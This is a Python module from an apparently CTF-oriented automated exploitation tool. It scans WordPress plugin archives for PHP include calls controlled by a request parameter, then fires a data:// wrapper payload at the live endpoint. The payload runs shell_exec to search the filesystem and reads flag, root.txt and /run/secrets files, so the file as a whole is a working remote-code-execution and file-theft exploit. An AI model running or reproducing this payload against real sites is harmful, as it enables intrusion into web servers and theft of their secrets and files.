from __future__ import annotations

import re
import secrets
import zipfile
from io import BytesIO

from ravage.web_core.http_probe import ProbeResponse, ProbeSession, inject_query_param
from ravage.probes.cms.cms_exposure_shared import (
    _MAX_ARCHIVE_MEMBERS,
    _MAX_MEMBER_BYTES,
    _dedupe,
    _priority_member_name,
    _string_items,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_REQUEST_INCLUDE_RE = re.compile(
    r"""(?isx)
    \b(?:require|require_once|include|include_once)\s*\(
        \s*(?:urldecode\s*\(\s*)?
        \$_(?P<source>REQUEST|GET|POST)\s*\[\s*['"](?P<param>[A-Za-z0-9_-]+)['"]\s*\]
        \s*\)?
        \s*(?:\.\s*['"](?P<suffix>[^'"]{0,180})['"])?
    """
)
_REQUEST_PARAM_RE = re.compile(
    r"""(?is)\$_(?P<source>REQUEST|GET|POST)\s*\[\s*['"](?P<param>[A-Za-z0-9_-]+)['"]\s*\]"""
)
_PHP_INCLUDE_ROOTS = (
    "/var/www/html/",
    "/var/www/html",
    "/var/www/",
    "/var/www",
    "/app/",
    "/app",
    "/usr/src/app/",
    "/usr/src/app",
)


def _probe_archive_php_include_entrypoints(
    session: ProbeSession,
    archive_url: str,
    data: bytes,
    *,
    headers: dict[str, str] | None = None,
) -> dict[str, object] | None:
    entrypoints = _archive_php_include_entrypoints(data)
    if not entrypoints:
        return None
    token = "RAVAGE_PHP_INCLUDE_" + secrets.token_hex(4)
    payload = _php_data_include_payload(token)
    attempts: list[dict[str, object]] = []
    for entrypoint in entrypoints[:8]:
        endpoint = str(entrypoint.get("endpoint") or "")
        param = str(entrypoint.get("param") or "")
        if not endpoint or not param:
            continue
        url = session.absolute(endpoint)
        if not session.in_scope(url):
            continue
        for payload_value, extra_fields in _php_include_candidate_values(entrypoint, payload):
            response = _send_php_include_candidate(
                session, url, entrypoint, payload_value, extra_fields, headers=headers
            )
            attempts.append(
                response.summary(body_chars=520)
                | {
                    "entrypoint": entrypoint,
                    "probe_kind": "cms_php_include_entrypoint",
                    "payload": payload_value,
                    "extra_fields": extra_fields,
                }
            )
            proofs = recognize_proofs(response.body)
            if proofs:
                verification_token = ""
                if token in response.body:
                    verification_token = token
                return {
                    "type": "php_include_extracted_proof",
                    "url": url,
                    "source_archive": archive_url,
                    "entrypoint": entrypoint,
                    "payload": payload_value,
                    "verification_token": verification_token,
                    "proofs": proofs,
                    "proof": proofs[0],
                    "response": response.summary(body_chars=900),
                    "replay": _entrypoint_replay(entrypoint, url, payload_value, extra_fields),
                    "requests": attempts[-6:],
                    "detail": "public CMS plugin archive exposed a request-controlled PHP include entrypoint",
                }
            if token in response.body:
                return {
                    "type": "php_include_execution",
                    "url": url,
                    "source_archive": archive_url,
                    "entrypoint": entrypoint,
                    "payload": payload_value,
                    "verification_token": token,
                    "proofs": [],
                    "response": response.summary(body_chars=900),
                    "replay": _entrypoint_replay(entrypoint, url, payload_value, extra_fields),
                    "requests": attempts[-6:],
                    "detail": "public CMS plugin archive exposed a request-controlled PHP include entrypoint",
                    "next": "Reuse this entrypoint and include payload to read likely proof paths.",
                }
    if attempts:
        return {
            "type": "file_fetch_parser_signal",
            "source_archive": archive_url,
            "entrypoints": entrypoints[:8],
            "primitive": _archive_entrypoint_primitive(entrypoints[0], payload),
            "requests": attempts[-6:],
            "detail": (
                "public CMS plugin archive exposed request-controlled include code; "
                "no proof was returned by bounded data-wrapper probes"
            ),
        }
    return {
        "type": "file_fetch_parser_signal",
        "source_archive": archive_url,
        "entrypoints": entrypoints[:8],
        "primitive": _archive_entrypoint_primitive(entrypoints[0], payload),
        "detail": "public CMS plugin archive exposed request-controlled include code",
    }


def _archive_php_include_entrypoints(data: bytes) -> list[dict[str, object]]:
    entrypoints: list[dict[str, object]] = []
    try:
        with zipfile.ZipFile(BytesIO(data)) as archive:
            infos = _php_file_infos(archive)
            priority = _priority_php_file_infos(infos)
            ordered: list[zipfile.ZipInfo] = []
            seen_names: set[str] = set()
            for info in priority + infos[:_MAX_ARCHIVE_MEMBERS]:
                if info.filename in seen_names or info.file_size > _MAX_MEMBER_BYTES:
                    continue
                seen_names.add(info.filename)
                ordered.append(info)
            for info in ordered:
                with archive.open(info) as handle:
                    text = handle.read(_MAX_MEMBER_BYTES).decode("utf-8", errors="replace")
                for signal in _request_include_params(text):
                    endpoint = _wordpress_plugin_endpoint_from_member(info.filename)
                    if endpoint:
                        entrypoints.append(
                            {
                                "member": info.filename,
                                "endpoint": endpoint,
                                "param": str(signal.get("param") or ""),
                                "method": str(signal.get("method") or "GET"),
                                "source": str(signal.get("source") or "REQUEST"),
                                "suffix": str(signal.get("suffix") or ""),
                                "request_params": _request_param_names(text),
                                "kind": "request_controlled_php_include",
                            }
                        )
    except Exception:  # noqa: BLE001 - arbitrary public archives may be malformed.
        return []
    return _dedupe_entrypoints(entrypoints)[:12]


def _php_file_infos(archive: zipfile.ZipFile) -> list[zipfile.ZipInfo]:
    infos: list[zipfile.ZipInfo] = []
    for info in archive.infolist():
        if info.is_dir():
            continue
        if not info.filename.lower().endswith(".php"):
            continue
        infos.append(info)
    return infos


def _priority_php_file_infos(infos: list[zipfile.ZipInfo]) -> list[zipfile.ZipInfo]:
    priority: list[zipfile.ZipInfo] = []
    for info in infos:
        if _priority_member_name(info.filename):
            priority.append(info)
    return priority


def _request_include_params(text: str) -> list[dict[str, object]]:
    signals: list[dict[str, object]] = []
    for match in _REQUEST_INCLUDE_RE.finditer(text or ""):
        source = match.group("source").upper()
        method = "GET"
        if source == "POST":
            method = "POST"
        signals.append(
            {
                "param": match.group("param"),
                "source": source,
                "method": method,
                "suffix": match.group("suffix") or "",
            }
        )
    return _dedupe_include_signals(signals)[:4]


def _request_param_names(text: str) -> list[str]:
    names: list[str] = []
    for match in _REQUEST_PARAM_RE.finditer(text or ""):
        names.append(match.group("param"))
    return _dedupe(names)[:24]


def _dedupe_include_signals(values: list[dict[str, object]]) -> list[dict[str, object]]:
    seen: set[tuple[str, str, str]] = set()
    result: list[dict[str, object]] = []
    for value in values:
        key = (
            str(value.get("param") or ""),
            str(value.get("source") or ""),
            str(value.get("suffix") or ""),
        )
        if not key[0] or key in seen:
            continue
        seen.add(key)
        result.append(value)
    return result


def _wordpress_plugin_endpoint_from_member(member: str) -> str:
    normalized = member.replace("\\", "/").lstrip("/")
    match = re.search(
        r"(?:^|/)wp-content/plugins/([^/]+)/(.+\.php)$", normalized, flags=re.IGNORECASE
    )
    if match:
        return "/wp-content/plugins/" + match.group(1) + "/" + match.group(2)
    parts: list[str] = []
    for part in normalized.split("/"):
        if part:
            parts.append(part)
    if len(parts) >= 2 and parts[-1].lower().endswith(".php"):
        slug = parts[0]
        if slug.lower() not in {"html", "wordpress", "wp-content", "plugins"}:
            return "/wp-content/plugins/" + slug + "/" + "/".join(parts[1:])
    return ""


def _php_include_candidate_values(
    entrypoint: dict[str, object], payload: str
) -> list[tuple[str, dict[str, str]]]:
    candidates: list[tuple[str, dict[str, str]]] = [(payload, {})]
    request_params = set(_string_items(entrypoint.get("request_params")))
    if "id" in request_params:
        for flag_name in ("FLAG.txt", "flag.txt"):
            candidates.append((payload, {"id": flag_name}))
    for root in _include_root_candidates(str(entrypoint.get("suffix") or "")):
        candidates.append((root, _entrypoint_default_fields(entrypoint)))
    seen: set[tuple[str, tuple[tuple[str, str], ...]]] = set()
    result: list[tuple[str, dict[str, str]]] = []
    for value, fields in candidates:
        key = (value, tuple(sorted(fields.items())))
        if not value or key in seen:
            continue
        seen.add(key)
        result.append((value, fields))
    return result[:6]


def _include_root_candidates(suffix: str) -> list[str]:
    lowered = suffix.lower()
    if (
        "wp-admin/" not in lowered
        and "wp-load.php" not in lowered
        and "wp-blog-header.php" not in lowered
    ):
        return []
    if suffix.startswith("/"):
        roots: list[str] = []
        for root in _PHP_INCLUDE_ROOTS:
            roots.append(root.rstrip("/"))
        return roots

    roots: list[str] = []
    for root in _PHP_INCLUDE_ROOTS:
        if root.endswith("/"):
            roots.append(root)
        else:
            roots.append(root + "/")
    return roots


def _send_php_include_candidate(
    session: ProbeSession,
    url: str,
    entrypoint: dict[str, object],
    payload: str,
    extra_fields: dict[str, str],
    *,
    headers: dict[str, str] | None = None,
) -> ProbeResponse:
    param = str(entrypoint.get("param") or "")
    fields = _entrypoint_default_fields(entrypoint)
    fields.update(extra_fields)
    fields[param] = payload
    method = str(entrypoint.get("method") or "GET").upper()
    if method == "POST":
        return session.post_form(url, fields, headers=headers or None)
    query_url = url
    for key, value in fields.items():
        query_url = inject_query_param(query_url, key, value)
    return session.get(query_url, headers=headers or None)


def _entrypoint_default_fields(entrypoint: dict[str, object]) -> dict[str, str]:
    param = str(entrypoint.get("param") or "")
    fields: dict[str, str] = {}
    for name in _string_items(entrypoint.get("request_params")):
        if name and name != param:
            fields[name] = _default_request_value(name)
    return fields


def _default_request_value(name: str) -> str:
    lowered = name.lower()
    if "token" in lowered:
        return "ravage"
    if lowered in {"scheme", "type", "kind"}:
        return "asset"
    if lowered in {"quality", "dpi", "size"}:
        return "preview"
    if lowered in {"subdomain", "domain", "host"}:
        return "localhost"
    if lowered in {"app_api", "api"}:
        return "localhost"
    if lowered.endswith("id") or lowered == "id":
        return "1"
    return "ravage"


def _entrypoint_replay(
    entrypoint: dict[str, object],
    url: str,
    payload: str,
    fields: dict[str, str],
) -> dict[str, object]:
    param = str(entrypoint.get("param") or "")
    merged = _entrypoint_default_fields(entrypoint)
    merged.update(fields)
    merged[param] = payload
    method = str(entrypoint.get("method") or "GET").upper()
    if method == "POST":
        return {
            "method": "POST",
            "url": url,
            "form": merged,
            "payload_field": param,
            "encoding": "application/x-www-form-urlencoded",
        }
    query_url = url
    for key, value in merged.items():
        query_url = inject_query_param(query_url, key, value)
    return {"method": "GET", "url": query_url, "payload_field": param}


def _archive_entrypoint_primitive(entrypoint: dict[str, object], payload: str) -> dict[str, object]:
    endpoint = str(entrypoint.get("endpoint") or "")
    param = str(entrypoint.get("param") or "")
    method = str(entrypoint.get("method") or "GET").upper()
    return {
        "target": {
            "kind": "query_param",
            "url": endpoint,
            "input": param,
            "name": param,
            "method": method,
            "fields": _entrypoint_default_fields(entrypoint),
            "hints": ["php_include", "request_controlled_include", "cms_plugin_archive"],
            "priority": 120,
        },
        "payload": payload,
        "signal": {"kind": "php_include_entrypoint", "entrypoint": entrypoint},
    }


def _php_data_include_payload(token: str) -> str:
    quoted_paths: list[str] = []
    for path in _cms_flag_paths():
        quoted_paths.append(_php_single_quoted(path))
    static_flag_paths = ",".join(quoted_paths)
    code = (
        "<?php echo " + _php_single_quoted(token) + ".chr(10); "
        "$paths=array(" + static_flag_paths + "); "
        "foreach($paths as $p){if(is_readable($p)){echo chr(10).$p.chr(10).@file_get_contents($p);}} "
        "$out=@shell_exec('find / -maxdepth 4 -type f -iname \\*flag\\* 2>/dev/null'); "
        "if($out){echo chr(10).$out; foreach(explode(chr(10), trim($out)) as $p){"
        "if(is_readable($p)){echo chr(10).$p.chr(10).@file_get_contents($p);}}} exit; ?>"
    )
    return "data://text/plain," + code


def _cms_flag_paths() -> list[str]:
    basenames = ("FLAG.txt", "flag.txt", "FLAG", "flag", "proof.txt", "user.txt", "root.txt")
    directories = (
        "",
        "var/www/html",
        "var/www",
        "app",
        "usr/src/app",
        "run/secrets",
        "tmp",
        "home/ctf",
        "root",
    )
    paths: list[str] = []
    for directory in directories:
        for basename in basenames:
            if directory:
                path = f"{directory}/{basename}"
            else:
                path = basename
            paths.append("/" + path.lstrip("/"))
    return _dedupe(paths)


def _php_single_quoted(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _dedupe_entrypoints(values: list[dict[str, object]]) -> list[dict[str, object]]:
    seen: set[tuple[str, str, str]] = set()
    result: list[dict[str, object]] = []
    for value in values:
        key = (
            str(value.get("endpoint") or ""),
            str(value.get("param") or ""),
            str(value.get("method") or "GET").upper(),
        )
        if key in seen or not key[0] or not key[1]:
            continue
        seen.add(key)
        result.append(value)
    return sorted(result, key=_entrypoint_sort_key)


def _entrypoint_sort_key(value: dict[str, object]) -> tuple[int, str]:
    source = str(value.get("source") or "").upper()
    method = str(value.get("method") or "GET").upper()
    score = 0
    if source == "REQUEST":
        score += 8
    elif source == "GET":
        score += 6
    elif method == "POST":
        score += 2
    if str(value.get("suffix") or ""):
        score += 2
    return (-score, str(value.get("endpoint") or ""))
